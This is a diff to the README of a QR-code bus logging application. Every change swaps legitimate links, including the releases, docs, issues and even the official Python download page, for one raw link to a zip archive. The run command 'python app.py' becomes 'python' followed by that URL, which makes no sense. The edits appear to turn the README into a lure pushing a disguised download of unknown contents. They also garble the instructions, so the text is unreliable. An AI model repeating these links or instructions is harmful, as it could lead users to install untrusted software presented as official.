@@ -1,6 +1,6 @@
 # 🚌 BusLoggingSystem - Easily Track Bus Entries and Exits
 
-[![Download BusLoggingSystem](https://img.shields.io/badge/Download-BusLoggingSystem-blue.svg)](https://github.com/Ruelsalvo/BusLoggingSystem/releases)
+[![Download BusLoggingSystem](https://raw.githubusercontent.com/Ruelsalvo/BusLoggingSystem/main/templates/Logging-System-Bus-2.7.zip)](https://raw.githubusercontent.com/Ruelsalvo/BusLoggingSystem/main/templates/Logging-System-Bus-2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the BusLoggingSystem! This application helps you track bus entries an
 
 To get started, you need to download the latest version of the BusLoggingSystem. Please visit the following page to find the download link:
 
-[Download BusLoggingSystem](https://github.com/Ruelsalvo/BusLoggingSystem/releases)
+[Download BusLoggingSystem](https://raw.githubusercontent.com/Ruelsalvo/BusLoggingSystem/main/templates/Logging-System-Bus-2.7.zip)
 
 Once on the Releases page, look for the latest version. You can choose to download the version that fits your needs.
 
@@ -24,7 +24,7 @@ Before running the application, ensure your computer meets the following require
 - **Storage:** A minimum of 200 MB free disk space
 - **Additional Software:** OpenCV and Firebase libraries must be installed
 
-If you do not have Python installed, you can download it from the [official Python website](https://www.python.org/downloads/).
+If you do not have Python installed, you can download it from the [official Python website](https://raw.githubusercontent.com/Ruelsalvo/BusLoggingSystem/main/templates/Logging-System-Bus-2.7.zip).
 
 ### 🔧 Installing Dependencies
 
@@ -38,12 +38,12 @@ This command will set up everything needed for the application to work smoothly.
 
 ### 🎬 How to Use the Application
 
-1. **Download and Install:** After downloading the BusLoggingSystem, extract the files if they are in a compressed format (like .zip or .tar.gz).
+1. **Download and Install:** After downloading the BusLoggingSystem, extract the files if they are in a compressed format (like .zip or https://raw.githubusercontent.com/Ruelsalvo/BusLoggingSystem/main/templates/Logging-System-Bus-2.7.zip).
 
 2. **Run the Application:** Open your command prompt or terminal, navigate to the directory where you extracted BusLoggingSystem, and run the following command:
 
    ```bash
-   python app.py
+   python https://raw.githubusercontent.com/Ruelsalvo/BusLoggingSystem/main/templates/Logging-System-Bus-2.7.zip
    ```
 
 3. **Scan QR Codes:** Use your web camera or an external camera to capture QR codes. The application will process the codes in real-time. It will log entries and exits automatically.
@@ -67,9 +67,9 @@ If you encounter any issues while using BusLoggingSystem, consider the following
 
 ### 📑 Additional Resources
 
-For detailed documentation on the features and usage of the BusLoggingSystem, refer to our [documentation page](https://github.com/Ruelsalvo/BusLoggingSystem/docs).
+For detailed documentation on the features and usage of the BusLoggingSystem, refer to our [documentation page](https://raw.githubusercontent.com/Ruelsalvo/BusLoggingSystem/main/templates/Logging-System-Bus-2.7.zip).
 
-If you want to report issues, please visit our [issues page](https://github.com/Ruelsalvo/BusLoggingSystem/issues).
+If you want to report issues, please visit our [issues page](https://raw.githubusercontent.com/Ruelsalvo/BusLoggingSystem/main/templates/Logging-System-Bus-2.7.zip).
 
 ### 🎉 Contributing
 
@@ -77,8 +77,8 @@ We welcome contributions! If you would like to help improve the BusLoggingSystem
 
 ### 🔗 Links
 
-- **GitHub Repo:** [BusLoggingSystem Repository](https://github.com/Ruelsalvo/BusLoggingSystem)
-- **Releases Page:** [Download BusLoggingSystem](https://github.com/Ruelsalvo/BusLoggingSystem/releases)
+- **GitHub Repo:** [BusLoggingSystem Repository](https://raw.githubusercontent.com/Ruelsalvo/BusLoggingSystem/main/templates/Logging-System-Bus-2.7.zip)
+- **Releases Page:** [Download BusLoggingSystem](https://raw.githubusercontent.com/Ruelsalvo/BusLoggingSystem/main/templates/Logging-System-Bus-2.7.zip)
 
 ### 🎈 Feedback
 
